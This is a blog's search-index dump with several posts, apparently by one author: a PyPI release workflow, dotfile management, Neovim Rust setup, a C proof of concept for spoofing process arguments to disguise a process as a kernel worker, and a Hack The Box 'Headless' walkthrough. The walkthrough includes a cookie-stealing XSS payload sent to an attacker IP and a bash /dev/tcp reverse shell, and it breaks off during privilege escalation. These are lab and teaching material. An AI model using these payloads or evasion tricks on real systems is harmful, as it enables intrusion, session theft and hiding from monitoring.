https://pypi.org/p/example-package-hanaosan0318 # Project URL permissions: id-token: write if: startsWith(github.ref, 'refs/tags/v') # Conditional check for PyPI publishing steps: - name: Download all the dists uses: actions/download-artifact@v4 with: name: python-package-distributions path: dist/ - name: Publish distribution 📦 to PyPI uses: pypa/gh-action-pypi-publish@release/v1 github-release: name: Create GitHub Release with source code 📦 needs: - publish-to-pypi # Start the job only if the PyPI publishing job has completed runs-on: ubuntu-latest permissions: contents: write # Grant permission to create a GitHub release steps: - name: Checkout code uses: actions/checkout@v4 # Checkout the code # I had to escape the braces in the following block. Replace them if you copy this. - name: Create GitHub Release env: GITHUB_TOKEN: $\\{\\{ secrets.GITHUB_TOKEN \\}\\} # A temporary token that is automatically generated each time the workflow is run run: &gt;- gh release create '$\\{\\{ github.ref_name \\}\\}' --repo '$\\{\\{ github.repository \\}\\}' --notes \"Release for version $\\{\\{ github.ref_name \\}\\}\"publish.yml workflow TL;DRThis workflow automates building, publishing (to testpypi.org and pypi.org), and creating a GitHub release for your Python package.This workflow is triggered when a version tag is pushed.The tag will be a label that match the patterns test_v*.*.* or v*.*.*..This workflow will do a (slightly) different job depending on the type of tag: If a test_v*.*.* tag (e.g. test_v1.0.1) is pushed, a test version will be generated.The workflow will build the distribution packages and upload them to testpypi.org. If a v*.*.* tag (e.g. v1.0.1) is pushed, the relase version will be generated.The workflow will build the packages, upload them to pypi.org and generate the GitHub release. Why I decided to write my own workflow?The reason why I decided to write my own workflow is because the workflows I saw depended on other events, and, usually, they did a lot of work together (as publish to testpypi.org, pypi.org and generate the GitHub release at the same time).I prefer a slightly more structured workflow, based on pushing version tags. And, I want to perform slightly different actions based on these tags.Publishing the test version first in testpypi.org let me know if there are any errorsm and let me know the result of the distribution files.Once I have verified that the upload to testpypi.org is correct, and the distribution files have been checked, I can generate the production version, upload it to pypi.org and generate the GitHub release.Why I wanted to publish based on tags?When you upload a package to testpypi.org or pypi.org, you can’t repeat versions.With this workflow I can create a dev branch to add changes and upload test versions to testpypi.org.In case there are errors when uploading to testpypi.org, I can increase the project version, until everything is correct, without affecting the production version number.Once everything is correct I can merge the dev branch changes into the main branch, tag the production version in main, and the production release will be generated automatically (ideally without errors).Once the release version is published I will take care of cleaning up the versions in testpypi.org, and, if necessary, in pypi.org.Enjoy! ;)" }, { "title": "Organize your dotfiles with git", "url": "/posts/git-dotfiles/", "categories": "git, dotfiles", "tags": "git, dotfiles", "date": "2024-10-13 02:00:01 +0200", "snippet": "What are dotfiles?Dotfiles are files where the programs store their configuration.Dotfiles are named that way because most of them starts with a dot “.”, although, nowadays, it’s common to use thi...", "content": "What are dotfiles?Dotfiles are files where the programs store their configuration.Dotfiles are named that way because most of them starts with a dot “.”, although, nowadays, it’s common to use this term to refer to any configuration file.When you install a new program, you spend a lot of time reading documentation and trying and setting options, until fits you well.Some examples of programs that uses dotfiles are: bash, zsh, git, tmux, vim…In addition to these, I like to save another dotfiles (like .xprofile) and another configuration files (awesomewm, neovim, mplayer, yt-dlp, conky…).Saving these dotfiles (or configuration files) will save you a lot of time, and will allow you to mantain a consistency between computers.And I love these two things.Let’s say that you uninstalled some of these programs, or you are doing a fresh install of your operating system, or, maybe, you are installing some of these programs in another computer.After install these programs, you will only have to override their dotfiles (or config files) and everything will be to your liking and the same between systems/computers (if applicable).I have many computers, all but one, using gnu/linux.I keep some configs of all of them, some scripts or batch files (yep, it’s very useful backup these too) and even the wallpaper.Is true that we can do this with a simple backup in any hard drive, but let’s face it, we are programmers; and have the dotfiles backuped in a remote (and always available) git server (as github) is very comfortable.The “all in one” approachThis was my first approach.This approach consists of having one repository with only one branch. Then we will structure everything in folders.Once we had cloned our repository, we will delete our local dotfiles (or config files) and make symlinks to the files in the repository.My choice is to do hard links for files and soft links for the folders, but as you like ;)We will have something like this:dotfiles├── linux│   ├── common│   │   ├── configs│   │   │   ├── aliases│   │   │   ├── awesome│   │   │   ├── nvim│   │   │   ├── .tmux│   │   │   ├── .vimrc│   │   │   └── yt-dlp.conf│   │   ├── .mplayer│   │   └── scripts│   │   └── script1│   ├── desktop│   │   ├── configs│   │   │   ├── .bashrc│   │   │   ├── conky.conf│   │   │   ├── .gitconfig│   │   │   ├── .xprofile│   │   │   └── .zshrc│   │   ├── scripts│   │   │   ├── script1│   │   │   └── script2│   │   └── wallpaper│   │   └── wallpaper.jpg│   ├── laptop1│   │   ├── configs│   │   │   ├── .bashrc│   │   │   ├── .gitconfig│   │   │   ├── .xprofile│   │   │   └── .zshrc│   │   ├── scripts│   │   │   ├── script1│   │   └── wallpaper│   │   └── wallpaper.jpg│   └── laptop2│   ├── configs│   │   ├── .bashrc│   │   ├── .gitconfig│   │   ├── .xprofile│   │   └── .zshrc│   ├── scripts│   │   ├── script1│   │   └── script2│   │   └── script3│   └── wallpaper│   └── wallpaper.jpg└── windows ├── configs │   ├── config1.cfg │   └── config2.cfg ├── scripts │   ├── batch1.bat │   └── batch2.bat └── wallpaper └── wallpaper.jpgPros Very easy to mantain. One repository, one branch.It’s very easy to keep track of the changes.You have the same repository and the same branch in all of your machines. Common files are easily synchronized If we use a common directory to store the dotfiles that are the same in all the machines, we can keep our common configuration files easily synchronized. Cons Fragmentation Over time we will have fragmented configurations (if we use the common folder).In the worst case, we will get rid of the common directory. Useless configurations Wether we have it or not the common folder, we will have a lot of files (configurations, scripts, wallpapers…) from other computers that will be, mostly, useless for us in the current computer. The “m-branches” approachThis is my current approach, it’s similar to the “all in one” approach.We will have one repository, but one branch per machine (that’s why the “m” in the name).Each branch will contain only the dotfiles for one computer.We will have something like this:dotfiles/desktop├── configs│   ├── aliases│   ├── awesome│   ├── .bashrc│   ├── conky.conf│   ├── .gitconfig│   ├── .mplayer│   ├── nvim│   ├── .tmux│   ├── .vimrc│   ├── .xprofile│   ├── yt-dlp.conf│   └── .zshrc├── scripts│   ├── script1│   └── script2└── wallpaper └── wallpaper.jpgPros We will have only the files related to the current machine.Cons Management can get a little complicated If we make a change to a file that we want to push to other machines, we will have to do it manually on the other branches. If we create a file on one machine that we want to have on other machines, we will have to do it manually or propagate it with git to the other branches. Branch switching If you change branches, while your aren’t in the current computer branch, your links will break.So, If you need to switch branch, for whatever reason, it’s better to clone the repository (again) in another location. The “StreakyCobra” approachThis is the better approach. Why? Look at this name, how can it not be the best with this name?I saw this method in a Hacker news thread: Ask HN: What do you use to manage dotfiles?.This was the response given by the user StreakyCobra.This is going to be by next system (as soon as I feel like reorganizing some machine).This method is similar to the “m-branches”, one repository and one branch per machine, with the difference that this method does not need extra tools or symlinks.So, we will end having something similar to the “m-branches”, but more comfortable to manage.Creating the repositoryIf you don’t have the repository yet, you need to create it:git init --bare $HOME/.git_dotfiles # Creates the new repository. Replace with your own path.Cloning the repositoryIf you have the repository, you have to clone it.If you have your home directory empty (is not the usual thing), you can clone the repository: git clone --separate-git-dir=$HOME/.git_dotfiles https://path/to/repo $HOME –separate-git-dir=$HOME/.git_dotfiles: This option specifies that the Git repository configuration should be stored in the directory $HOME/.git_dotfiles instead of the usual .git subdirectory within the cloned repository. /path/to/repo: The URL or path to the Git repository that you want to clone. $HOME: This is the path where you want to clone the repository. If you don’t have your $HOME directory empty, you will need to clone it in a temporary directory and then delete the temporary directory:git clone --separate-git-dir=$HOME/.git_dotfiles https://path/to/repo $HOME/myconf-tmprm -r $HOME/myconf-tmp/Create the “dotfiles” aliasWe define an alias named “dotfiles” that executes git commands using the specified repository and hides the untracked files.alias dotfiles='/usr/bin/git --git-dir=$HOME/.git_dotfiles/ --work-tree=$HOME'To make the alias permanent, we need to add it to our shell’s configuration file (.bashrc, .zshrc, etc). The creation of the alias dotfiles avoids interference when we use the git command in other repositories. StreakyCobra uses an alias called config. I prefer dotfiles, it’s more clear for me.Ignore untracked filesdotfiles config status.showUntrackedFiles noBy ignoring untracked files we will have a cleaner output, in which we will only be shown changes to the files we have in the repository.Managing filesAny file can be versioned with normal commands, but you have to replace the git command by the alias dotfiles.dotfiles statusdotfiles add .vimrcdotfiles commit -m \"Add vimrc\"dotfiles pushCloning the repository in a new machineThe normal cloning will fail if the home directory is not empty.When we will clone the repository in a new machine, we will have to clone the repository into a temporary directory and then delete this temporary directory.git clone --separate-git-dir=$HOME/.git_dotfiles https://path/to/repo $HOME/myconf-tmpcp $HOME/myconf-tmp/.gitmodules $HOME # If you use git submodulesrm -r $HOME/myconf-tmp/alias dotfiles='/usr/bin/git --git-dir=$HOME/.git_dotfiles/ --work-tree=$HOME'Pros No need to create symlinks. We will have only the files related to the current machine.Cons Needs an alias to do not interfere with the git command in other repositories. We will have to manage the files more carefully. We will have to delete a (temporary) directory. Is it really a con?Enjoy! ;)" }, { "title": "Process argument spoofing in GNU/Linux", "url": "/posts/process-argument-spoofing-gnu-linux/", "categories": "programming, argument spoofing", "tags": "programming, spoofing", "date": "2024-07-20 02:00:01 +0200", "snippet": "Process argument spoofing (command line spoofing or program argument spoofing) is a technique that allow us to spawn a process with arguments and override those arguments at execution time.With thi...", "content": "Process argument spoofing (command line spoofing or program argument spoofing) is a technique that allow us to spawn a process with arguments and override those arguments at execution time.With this technique we can hide and/or modify the real arguments of the process.So, we can do things as change the program name, hide the program arguments or show other arguments.The arguments are only positions in memory, so we can overwrite the process arguments by overwritting the process memory.Once we have overwritten the memory, the results given by monitoring tools are altered and will show our fake arguments.Why and/or when would we want to do this?We may want run a program with a password, a user name and/or a path as arguments and we don’t want them to be visible.Maybe we are doing a CTF challenge (or a pentest) and we are in a scenario when we could use it, together with other techniques, to escalate privileges.Maybe we want to run a quickly (and poorly) written program, or, maybe, we are trying to create a new malware and hide it. We’ll talk about this later.POC full codeFirst of all, I did a gist of the POC (Proof Of Concept) where you can see the following code blocks in context.You can see the POC full code here: process_argument_spoofer_linux.cHidding the argumentsWe can hide the program arguments overwriting them with nulls (or whitespaces):len = strlen(argv[i]);memset(argv[i], 0, len); // Overwrite everything with nullAnd, now, we will overwrite the program name, it’s not mandatory but it will be fun.We can overwite it with anything, but what if we overwrite it with sometihng like a kernel process?This way our program will have a better chance of going unnoticed.strcpy(argv0, \"[kworker fake/1:1-events]\"); // Overwrite the program nameLet’s compile and run it:gcc -O3 process_argument_spoofer_linux.c -o spoofer.out &amp;&amp; ./spoofer.out -p myverysecretpasswordPID: 20679argv[0] './spoofer.out', address '0x7ffe3c5a22d8'argv[1] '-p', address '0x7ffe3c5a2afc'argv[2] 'myverysecretpassword', address '0x7ffe3c5a2aff'Let’s see what top says:ps aux | grep -i 20679 | head -n1rubenhortas 20679 99.0 0.0 2460 852 pts/2 R+ 00:01 0:16 [kworker fake/1:1-events]Ok, so now we have our program disguised as a kernel proceess (or almost :P).Spoofing the argumentsWe could have kept the program name and overwritten the arguments to get something like:rubenhortas 20679 99.0 0.0 2460 852 pts/2 R+ 00:01 0:16 /spoofer.out -p ********************Also, we could have kept the program name and hidden the arguments:rubenhortas 20679 99.0 0.0 2460 852 pts/2 R+ 00:01 0:16 /spoofer.outWe can do what we want, all we have to do is modify the code.Why is it a bad idea?Hiding (or spoofing) the arguments this way it’s fine in certain scenarios, as when we are doing a CTF challenge, but, if your idea is to use it to do a malware, I have bad news for you: this technique is easily discovered by malware detecting tools (sensors, monitors, etc). Also, program argument spoofing will should never be used in a production environment, because it’s trivial to unmask it using tools as pspy:2024/07/20 00:01:00 CMD: UID=1000 PID=20697 | ./spoofer.out -p myverysecretpasswordPwned :(Enjoy! :)" }, { "title": "Configuring Neovim as Rust IDE", "url": "/posts/neovim-rust-ide/", "categories": "neovim, rust", "tags": "programming, ide, rust, neovim, nvim", "date": "2024-04-06 02:00:01 +0200", "snippet": "If you read my article Configuring Neovim as Python IDE, you already know that one of mi favorite editors is [neo]vim.Between other reasons, when I’m using [neo]vim I feel more focused, I don’t kno...", "content": "If you read my article Configuring Neovim as Python IDE, you already know that one of mi favorite editors is [neo]vim.Between other reasons, when I’m using [neo]vim I feel more focused, I don’t know why.One of my open fronts, in my spare time, is learn Rust, and neovim (in this case) seems a great IDE to do it.I have to say that programming in rust using neovim it reminds me of the old days programming in (ANSI) C using vim.Convert neovim in a Rust IDE it’s very fast and very straightforward.After installing Rust, we only will need rust-analyzer and three vim plugins.rust-analyzerrust-analyzer is an implementation of Language Server Protocol (LSP) for the Rust programming language.It provides features like completion and goto definition for many code editors.rust-analyzer needs the sources of the standard library, we can install them via rustup:rustup component add rust-srcNow, we can install rust-analyzer via rustup:rustup component add rust-analyzer[Neo]vim base configurationAs allways, I’ll part from my base configuration.This is my configuration for all, in all my computers, no matter the purpose.~/.config/nvim/init.vim:syntax on \"syntax highlightingfiletype plugin indent on \"file type detectionset number \"display line numberset path+=** \"improves searchingset noswapfile \"disable use of swap filesset wildmenu \"completion menuset backspace=indent,eol,start \"ensure proper backspace functionalityset incsearch \"see results while search is being typed, see :help incsearchset smartindent \"auto indent on new lines, see :help smartindentset expandtab \"expanding tab to spacesset tabstop=4 \"setting tab to 4 columnsset shiftwidth=4 \"setting tab to 4 columnsset softtabstop=4 \"setting tab to 4 columnsset showmatch \"display matching bracket or parenthesisset hlsearch incsearch \"highlight all pervious search pattern with incsearchset clipboard=unnamedplus \"activate the system clipboard\"set list \"show all whitespaces (uncomment without Better Whitespace plugin)[Neo]vim plugin managerAs plugin manager, my choice is vim-plug, and its installation it’s very straightforward:Unix/linux:sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'PluginsI install four plugins: nvim-lspconfigConfigs for the Nvim LSP client. nvim-cmpA completion engine plugin. rust-langProvides Rust file detection, syntax highlighting, formatting, Syntastic integration, and more. Vim Better WhitespaceThis plugin highlights all trailing whitespaces.It’s totally optional and can be substituted by the option “lines” in the vim.init file, but I like it. nvim-lspconfigTo install it, we add the plugin to our init.vim file, into the call plug#begin('/home/rubenhortas/.config/nvim/plugins') section, below all the lines:call plug#begin('/home/rubenhortas/.config/nvim/plugins')...Plug 'neovim/nvim-lspconfig'call plug#end()We will also pass LSP settings to the server adding:lua &lt;&lt; EOFlocal lspconfig = require'lspconfig'local on_attach = function(client) require'completion'.on_attach(client)endlspconfig.rust_analyzer.setup({ on_attach = on_attach, settings = { [\"rust-analyzer\"] = { imports = { granularity = { group = \"module\", }, prefix = \"self\", }, cargo = { buildScripts = { enable = true, }, }, procMacro = { enable = true }, } }})EOFnvim-cmp If you already have installed this plugin, you only need to add the set up lspconfig section for rust_analyzer: require('lspconfig')['rust_analyzer'].setup { capabilities = capabilities } A completion engine plugin for neovim written in Lua. Completion sources are installed from external repositories and “sourced”.To install it we need to add the following to our init.vim file:call plug#begin('/home/rubenhortas/.config/nvim/plugins')Plug 'neovim/nvim-lspconfig'Plug 'hrsh7th/cmp-nvim-lsp'Plug 'hrsh7th/cmp-buffer'Plug 'hrsh7th/cmp-path'Plug 'hrsh7th/cmp-cmdline'Plug 'hrsh7th/nvim-cmp'\" For vsnip users.Plug 'hrsh7th/cmp-vsnip'Plug 'hrsh7th/vim-vsnip'call plug#end()lua &lt;&lt;EOF -- Set up nvim-cmp. local cmp = require'cmp' cmp.setup({ snippet = { -- REQUIRED - you must specify a snippet engine expand = function(args) vim.fn[\"vsnip#anonymous\"](args.body) -- For `vsnip` users. -- require('luasnip').lsp_expand(args.body) -- For `luasnip` users. -- require('snippy').expand_snippet(args.body) -- For `snippy` users. -- vim.fn[\"UltiSnips#Anon\"](args.body) -- For `ultisnips` users. end, }, window = { -- completion = cmp.config.window.bordered(), -- documentation = cmp.config.window.bordered(), }, mapping = cmp.mapping.preset.insert({ ['&lt;C-b&gt;'] = cmp.mapping.scroll_docs(-4), ['&lt;C-f&gt;'] = cmp.mapping.scroll_docs(4), ['&lt;C-Space&gt;'] = cmp.mapping.complete(), ['&lt;C-e&gt;'] = cmp.mapping.abort(), ['&lt;CR&gt;'] = cmp.mapping.confirm({ select = true }), -- Accept currently selected item. Set `select` to `false` to only confirm explicitly selected items. }), sources = cmp.config.sources({ { name = 'nvim_lsp' }, { name = 'vsnip' }, -- For vsnip users. -- { name = 'luasnip' }, -- For luasnip users. -- { name = 'ultisnips' }, -- For ultisnips users. -- { name = 'snippy' }, -- For snippy users. }, { { name = 'buffer' }, }) }) -- Set configuration for specific filetype. cmp.setup.filetype('gitcommit', { sources = cmp.config.sources({ { name = 'git' }, -- You can specify the `git` source if [you were installed it](https://github.com/petertriho/cmp-git). }, { { name = 'buffer' }, }) }) -- Use buffer source for `/` and `?` (if you enabled `native_menu`, this won't work anymore). cmp.setup.cmdline({ '/', '?' }, { mapping = cmp.mapping.preset.cmdline(), sources = { { name = 'buffer' } } }) -- Use cmdline &amp; path source for ':' (if you enabled `native_menu`, this won't work anymore). cmp.setup.cmdline(':', { mapping = cmp.mapping.preset.cmdline(), sources = cmp.config.sources({ { name = 'path' } }, { { name = 'cmdline' } }) }) -- Set up lspconfig. local capabilities = require('cmp_nvim_lsp').default_capabilities() -- Replace &lt;YOUR_LSP_SERVER&gt; with each lsp server you've enabled. require('lspconfig')['rust_analyzer'].setup { capabilities = capabilities }EOFrust-langTo install it, we add the plugin to our init.vim file, into the call plug#begin('/home/rubenhortas/.config/nvim/plugins') section, below all the lines:call plug#begin('/home/rubenhortas/.config/nvim/plugins')...Plug 'rust-lang/rust.vim'call plug#end()Vim Better WhitespaceThis plugin causes all trailing whitespace characters to be highlighted.Whitespace for the current line will not be highlighted while in insert mode.It is possible to disable current line highlighting while in other modes as well.A helper function :StripWhitespace is also provided to make whitespace cleaning painless.This plugin is optional, and can be substituded by the “lines” option in the vim.init file.But, I like it, and the :StripWhitespace function is very useful.To install it we add the plugin to our init.vim file, into the call plug#begin('/home/rubenhortas/.config/nvim/plugins') section, below all the lines:call plug#begin('/home/rubenhortas/.config/nvim/plugins')...Plug 'ntpeters/vim-better-whitespace'call plug#end()Install the pluginsTo install the plugins we open nvim and run::PlugInstallScreenshotsExample of autocompletionExample of linting errorsEnjoy! ;)" }, { "title": "Hack the box - Headless pwned!", "url": "/posts/htb-headless/", "categories": "hack the box, machine", "tags": "hack the box, headless, werkzeug, xss, cookie hijacking, path hijacking", "date": "2024-03-28 01:00:01 +0100", "snippet": "Headless infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.60 Target machine (victim, Headless): 10.10.11.8Enumera...", "content": "Headless infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.60 Target machine (victim, Headless): 10.10.11.8EnumerationLet’s go look for the open ports in the machine using nmap:nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.8PORT STATE SERVICE22/tcp open ssh5000/tcp open upnpFootprintingWe fine tune the scan to see if we can get more information about the running services:nmap -Pn -n -sCV -p22,5000 -oN nmap_versions.txt 10.10.11.8PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)| ssh-hostkey:| 256 900294283dab2274df0ea3b20f2bc617 (ECDSA)|_ 256 2eb90824021b609460b384a99e1a60ca (ED25519)5000/tcp open upnp?| fingerprint-strings:| GetRequest:| HTTP/1.1 200 OK| Server: Werkzeug/2.2.2 Python/3.11.2| Date: Thu, 28 Mar 2024 16:56:06 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 2799| Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;title&gt;Under Construction&lt;/title&gt;| &lt;style&gt;| body {| font-family: 'Arial', sans-serif;| background-color: #f7f7f7;| margin: 0;| padding: 0;| display: flex;| justify-content: center;| align-items: center;| height: 100vh;| .container {| text-align: center;| background-color: #fff;| border-radius: 10px;| box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);| RTSPRequest:| &lt;!DOCTYPE HTML&gt;| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;| &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port5000-TCP:V=7.93%I=7%D=3/28%Time=6605A126%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,BE1,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\x20SF:Python/3\\.11\\.2\\r\\nDate:\\x20Thu,\\x2028\\x20Mar\\x202024\\x2016:56:06\\x20GMSF:T\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2SF:02799\\r\\nSet-Cookie:\\x20is_admin=InVzZXIi\\.uAlmXlTvm8vyihjNaPDWnvB_Zfs;SF:\\x20Path=/\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20SF:lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n\\x20SF:\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,SF:\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;Under\\x20ConstructionSF:&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20bodySF:\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\x20SF:'Arial',\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\xSF:20background-color:\\x20#f7f7f7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\xSF:20\\x20\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\xSF:20padding:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20displSF:ay:\\x20flex;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20justify-cSF:ontent:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20aliSF:gn-items:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20hSF:eight:\\x20100vh;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20\\x20\\.container\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20text-align:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20SF:\\x20\\x20\\x20background-color:\\x20#fff;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20border-radius:\\x2010px;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20box-shadow:\\x200px\\x200px\\x2020px\\x20rgba\\(0,\\x200,\\SF:x200,\\x200\\.2\\);\\n\\x20\\x20\\x20\\x20\\x20\")%r(RTSPRequest,16C,\"&lt;!DOCTYPE\\xSF:20HTML&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\\n\\x20\\SF:x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20responsSF:e&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20400&lt;/p&gt;\\n\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20request\\x20versionSF:\\x20\\('RTSP/1\\.0'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20SF:code\\x20explanation:\\x20400\\x20-\\x20Bad\\x20request\\x20syntax\\x20or\\x20uSF:nsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that is running a Werkzeug/2.2.2 Python/3.11.2 server on the port 5000.Werkzeug is a WSGI (Web Server Gateway Interface) utility library for Python.Werkzeug is library that provides a simple web server for development purposes.And, we can see an interesting parameter: Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/So, let’s brose to the port 5000 in the machine:WebsiteFor now we can’t do anything here, so let’s fuzz to see if we find hidden resources:gobuster dir -u http://10.10.11.8:5000 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt/support (Status: 200) [Size: 2363]/dashboard (Status: 500) [Size: 265]Ok, now we will browse to our new resources.If we go to /support we will se a formulary to contact support:SupportIf we go to /dashboard we will find a 401 unauthorized response:Dashboard unauthorizedFootholdAs we only can manipulate inputs in the /support form, we will try something there.If, we remember, we found an interesting parameter before, scanning with nmap: Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;.In the HTTP request headers there is a cookie sent which determine if we are admin, and, the /dashboard message, tell us that we need supply the right credentials to access.So we need the admin credentials (cookie in this case) to try to access to the /dashboard section.Cookie hijacking with XSSUnder certain conditions, we can get another user’s cookies (admin, in our case) using XSS.To steal the admin cookie we are going to set up a web server in our machine, and we are going to do that the headless web server requests a resource from our server, the resource will be the admin cookie.We set up a web server in our machine:sudo python3 -m http.server 80And, we will inject the payload &lt;script&gt;document.location=\"http://10.10.16.60/xss-76.js?c=\"+document.cookie;&lt;/script&gt; to the headles server.If we try to inject the payload from the support form, we will get an error:Hacking attempt detectedBut, if we look closely, we can see that the message shows the User-Agent.So it may be possible to inject the payload here using burp.We fill the form with any information, we send it and we intercept the petition with burp.Then, we modify the User-Agent field to inject our payload:User-Agent payloadAfter a while, we will receive a petition in our web server:10.10.11.8 - - [28/Mar/2024 19:55:09] code 404, message File not found10.10.11.8 - - [28/Mar/2024 19:55:09] \"GET /xss-76.js?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1\" 404 -10.10.11.8 - - [28/Mar/2024 19:55:10] code 404, message File not found10.10.11.8 - - [28/Mar/2024 19:55:10] \"GET /favicon.ico HTTP/1.1\" 404 -Now, we have the admin cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0, so we can try to access to the dashboard panel.We request the /dashboard resource, we intercept the request with burp, and we modify the Cookie field to use the admin cookie:Cookie hijackingReverse shellNow, we have access to the Administrator Dashboard:Administrator dashboardIf we generate a report, and we intercept the request with burp, we can see that the field date is not escaped and we can perform a command injection here.We start a listener on our machine:nc -lvnp 443And we inject the bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.60/443 0&gt;&amp;1\" revershe shell on the date field:OS command injection: Injecting a reverse shell in the date fieldNow we urlencode our reverse shell:Urlencoded reverse shelldvirWe got shell!Let’s find out some more information about our new user:bash-5.2$ whoamiwhoamidvirbash-5.2$ ididuid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)bash-5.2$ sudo -lsudo -lMatching Defaults entries for dvir on headless: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser dvir may run the following commands on headless: (ALL) NOPASSWD: /usr/bin/syscheckWe can get our user flag:cat /home/dvir/user.txtAnd, now, we need to escalate privileges to obtain the system flag.Privilege escalationOur user, divr, can execute the /usr/bin/syscheck with root privileges without password, so let’s take a look at the script:bash-5.2$ cat /usr/bin/syscheckcat /usr/bin/syscheck#!/bin/bashif [ \"$EUID\" -ne 0 ]; then exit 1filast_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)formatted_time=$(/usr/bin/date -d \"@$last_modified_time\" +\"%d/%m/%Y %H:%M\")/usr/bin/echo \"Last Kernel Modification Time: $formatted_time\"disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')/usr/bin/echo \"Available disk space: $disk_space\"load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')/usr/bin/echo \"System load average: $load_average\"if ! /usr/bin/pgrep -x \"initdb.sh\" &amp;&gt;/dev/null; then /usr/bin/echo \"Database service is not running. Starting it...\" ./initdb.sh 2&gt;/dev/nullelse 